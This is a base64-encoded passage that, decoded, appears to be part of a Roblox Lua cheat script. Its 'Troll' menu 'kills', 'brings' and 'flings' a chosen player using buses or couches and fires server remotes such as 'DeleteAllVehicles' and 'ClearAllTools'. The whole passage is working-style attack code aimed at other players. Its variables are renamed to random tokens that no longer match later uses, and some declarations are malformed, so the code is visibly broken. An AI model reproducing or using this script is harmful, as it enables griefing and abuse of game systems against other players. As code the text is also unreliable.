ciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9rNTg5N3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIHZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KFVwZGF0ZUNhbWVyYSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgVXBkYXRlQ2FtZXJhKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKICAgIGxvY2FsIHZhcl9iZWhhd3EgPSBUcm9sbDpBZGRTZWN0aW9uKHsgTmFtZSA9ICJraWxsIE1ldGhvZHMiIH0pCgogICAgVHJvbGw6QWRkRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAiTWV0aG9kIiwKICAgICAgICBPcHRpb25zID0geyJCdXMiLCJDb3VjaCJ9LAogICAgICAgIERlZmF1bHQgPSAiQ291Y2giLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIG1ldGhvZEtpbGwgPSB2YWx1ZQogICAgICAgICAgICBwcmludCgiTWV0aG9kIHNlbGVjdGVkOiAiIC4uIHRvc3RyaW5nKHZhbHVlKSkKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGw6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gImtpbGwgUGxheWVyIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9zbXRjczQgPSBJbnN0YW5jZS5uZXcoJ1NvdW5kJykKCiAgICAgICAgcy5OYW1lID0gJ1NvdW5kJwogICAgICAgIHMuU291bmRJZCA9ICdodHRwOi8vd3d3LnJvYmxveC5jb20vYXNzZXQvP2lkPTEwNzk3ODYwNDYwNTI2NScKICAgICAgICBzLlZvbHVtZSA9IDEKICAgICAgICBzLlBpdGNoID0gMQogICAgICAgIHMuTG9vcGVkID0gZmFsc2UKICAgICAgICBzLmFyY2hpdmFibGUgPSBmYWxzZQoKICAgICAgICBzLlBhcmVudCA9IGdhbWUuV29ya3NwYWNlCgoKICAgICAgICBzOnBsYXkoKQpnYW1lLlN0YXJ0ZXJHdWk6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKVGl0bGUgPSAiRXJyb3IiLApUZXh0ID0gIlBsYXllciBub3Qgc2VsZWN0ZWQgb3IgZG9lcyBub3QgZXhpc3QuIiwKRHVyYXRpb24gPSA0LAp9KQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBtZXRob2RLaWxsID09ICJDb3VjaCIgdGhlbgogICAgICAgICAgICAgICAgS2lsbFBsYXllckNvdWNoKCkKICAgICAgICAgICAgZWxzZWlmIG1ldGhvZEtpbGwgPT0gIkNvdWNoIHdpdGhvdXQgZ29pbmcgdG8gdGFyZ2V0IFtCRVRBXSIgdGhlbgogICAgICAgICAgICAgICAgS2lsbFdpdGhDb3VjaCgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIC0tIEJ1cyBtZXRob2QKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9hOW01MTQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9zcG9wNnogPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBub3QgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgd2FybigiRXJyb3I6IExvY2FsIHBsYXllcidzIEh1bWFub2lkUm9vdFBhcnQgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9za2h0d3kgPSBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9kOGo4ZmkgR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcTB4d2JuID0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVzIikKICAgICAgICAgICAgICAgICAgICBpZiB2ZWhpY2xlcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB2ZWhpY2xlczpGaW5kRmlyc3RDaGlsZChMb2NhbFBsYXllci5OYW1lIC4uICJDYXIiKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHJldHVybiBuaWwKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9xemtuMnkgPSBHZXRCdXMoKQoKICAgICAgICAgICAgICAgIGlmIG5vdCBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2p6andzZyA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSRSIpCiAgICAgICAgICAgICAgICAgICAgaWYgcmVtb3RlRXZlbnQgYW5kIHJlbW90ZUV2ZW50OkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmVtb3RlRXZlbnRbIjFDYTFyIl06RmlyZVNlcnZlcigiUGlja2luZ0NhciIsICJTY2hvb2xCdXMiKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgIGJ1cyA9IEdldEJ1cygpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9rMWIzdzkgPSBidXM6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKSBhbmQgYnVzLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikKICAgICAgICAgICAgICAgICAgICBpZiBzZWF0IGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGFuZCBub3QgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBzZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMiwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgb3Igbm90IGJ1cy5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCBvciBub3QgYnVzLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaywgdiBpbiBwYWlycyhidXMuQm9keTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblRvdWNoID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl92Y3d2aDAgVHJhY2tQbGF5ZXIoKQogICAgICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9sM290a2IgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfY3I2NndnID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRIdW1hbm9pZCBhbmQgdGFyZ2V0SHVtYW5vaWQuU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyLkh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1czpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KFZlY3RvcjMubmV3KDk5OTksIC00NTAsIDk5OTkpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJQbGF5ZXIgc2F0IGRvd24sIHRha2luZyBidXMgdG8gdGhlIHZvaWQhIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3M3MG0weiBzaW11bGF0ZUp1bXAoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl82MWwwMG0gPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNpbXVsYXRpbmcganVtcCEiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb3JpZ2luYWxQb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBsYXllciByZXR1cm5lZCB0byBpbml0aWFsIHBvc2l0aW9uLiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3ZhOTNjbCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfMjdyMHkzID0gdGljaygpICogMzUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3FtcWJucCA9IG1hdGguc2luKHRpbWUpICogNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfb2M4djZnID0gbWF0aC5jb3ModGltZSkgKiAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUodGFyZ2V0Um9vdC5DRnJhbWUgKiBDRnJhbWUubmV3KGxhdGVyYWxPZmZzZXQsIDAsIGZyb250QmFja09mZnNldCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHNwYXduKFRyYWNrUGxheWVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGw6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIkJyaW5nIFBsYXllciIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfOWN1Z3hnID0gSW5zdGFuY2UubmV3KCdTb3VuZCcpCgogICAgICAgIHMuTmFtZSA9ICdTb3VuZCcKICAgICAgICBzLlNvdW5kSWQgPSAnaHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMDc5Nzg2MDQ2MDUyNjUnCiAgICAgICAgcy5Wb2x1bWUgPSAxCiAgICAgICAgcy5QaXRjaCA9IDEKICAgICAgICBzLkxvb3BlZCA9IGZhbHNlCiAgICAgICAgcy5hcmNoaXZhYmxlID0gZmFsc2UKCiAgICAgICAgcy5QYXJlbnQgPSBnYW1lLldvcmtzcGFjZQoKCiAgICAgICAgczpwbGF5KCkKZ2FtZS5TdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7ClRpdGxlID0gIkVycm9yIiwKVGV4dCA9ICJQbGF5ZXIgbm90IHNlbGVjdGVkIG9yIGRvZXMgbm90IGV4aXN0LiIsCkR1cmF0aW9uID0gNCwKfSkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgbWV0aG9kS2lsbCA9PSAiQ291Y2giIHRoZW4KICAgICAgICAgICAgICAgIEJyaW5nUGxheWVyTExMKCkKICAgICAgICAgICAgZWxzZWlmIG1ldGhvZEtpbGwgPT0gIkNvdWNoIHdpdGhvdXQgZ29pbmcgdG8gdGFyZ2V0IFtCRVRBXSIgdGhlbgogICAgICAgICAgICAgICAgQnJpbmdXaXRoQ291Y2goKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAtLSBCdXMgbWV0aG9kCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcmZzNHlhID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcTdpdXB1ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgbm90IGh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIHdhcm4oIkVycm9yOiBMb2NhbCBwbGF5ZXIncyBIdW1hbm9pZFJvb3RQYXJ0IG5vdCBmb3VuZCIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNTI1Mm9oID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUKCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfemE1OTVjIEdldEJ1cygpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzFjZW4xeiA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgdmVoaWNsZXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoTG9jYWxQbGF5ZXIuTmFtZSAuLiAiQ2FyIikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfczFzNzR3ID0gR2V0QnVzKCkKCiAgICAgICAgICAgICAgICBpZiBub3QgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTExOC44MSwgNzUuOTk4LCAtMTEzOC42MSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl80YzJiMnIgPSBSZXBsaWNhdGVkU3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgiUkUiKQogICAgICAgICAgICAgICAgICAgIGlmIHJlbW90ZUV2ZW50IGFuZCByZW1vdGVFdmVudDpGaW5kRmlyc3RDaGlsZCgiMUNhMXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbW90ZUV2ZW50WyIxQ2ExciJdOkZpcmVTZXJ2ZXIoIlBpY2tpbmdDYXIiLCAiU2Nob29sQnVzIikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICBidXMgPSBHZXRCdXMoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcDhjb2t1ID0gYnVzOkZpbmRGaXJzdENoaWxkKCJCb2R5IikgYW5kIGJ1cy5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpCiAgICAgICAgICAgICAgICAgICAgaWYgc2VhdCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSBhbmQgbm90IGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gc2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDIsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBjaGFyYWN0ZXIuSHVtYW5vaWQuU2l0IG9yIG5vdCBidXMuUGFyZW50CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfZzJ2NXJuIFRyYWNrUGxheWVyKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNmxuOWcwID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2F1bHBmayA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SHVtYW5vaWQgYW5kIHRhcmdldEh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYXJhY3Rlci5IdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUob3JpZ2luYWxQb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfMHNvanZyID0geyBbMV0gPSAiRGVsZXRlQWxsVmVoaWNsZXMiIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9qNzZreTAgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzZrODVlNiA9IHRpY2soKSAqIDM1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9seDQ4YzggPSBtYXRoLnNpbih0aW1lKSAqIDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzUzanMzaCA9IG1hdGguY29zKHRpbWUpICogMjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVzOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKHRhcmdldFJvb3QuQ0ZyYW1lICogQ0ZyYW1lLm5ldyhsYXRlcmFsT2Zmc2V0LCAwLCBmcm9udEJhY2tPZmZzZXQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBzcGF3bihUcmFja1BsYXllcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKbG9jYWwgdmFyXzN5NXV4MCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHZhcl9vNWIyNGQgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHZhcl9kN3Q3ajUgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQpsb2NhbCB2YXJfMGo3MWZiLCBzZWxlY3RlZFBsYXllciA9IHt9LCBuaWwKbG9jYWwgdmFyXzM5aWJzbCA9IGZhbHNlCmxvY2FsIHZhcl9mYXhxNWQgPSBmYWxzZQoKVHJvbGw6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiRmxpbmcgIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCgogICAgICAgIGZsaW5nQWN0aXZlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX2JoZWZ4eSA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgICAgICBpZiBub3QgdGFyZ2V0IG9yIG5vdCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCB2YXJfMzlxOGczID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBsb2NhbCB2YXJfNG8xbmNzID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIG5vdCByb290IG9yIG5vdCB0Um9vdCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgbG9jYWwgdmFyXzZtancxNSA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCB2YXJfcXpzZ3RhID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgbG9jYWwgdmFyX2l4bml5aSA9IHJvb3QuQ0ZyYW1lCgpsb2NhbCB2YXJfOTk0NTE2ID0gewoJIkNsZWFyQWxsVG9vbHMiCn0KZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKCnRhc2sud2FpdCgwLjIpCgoKICAgICAgICAgICAgbG9jYWwgdmFyX3Q5dnR0aCA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgWzJdID0gIkNvdWNoIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgIGxvY2FsIHZhcl95bWtjeDMgPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcgogICAgICAgICAgICBlbmQKCQkJCXRhc2sud2FpdCgwLjIpCgkJCQlnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKTpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQp0YXNrLndhaXQoMC4yNSkKCiAgICAgICAgICAgIHdvc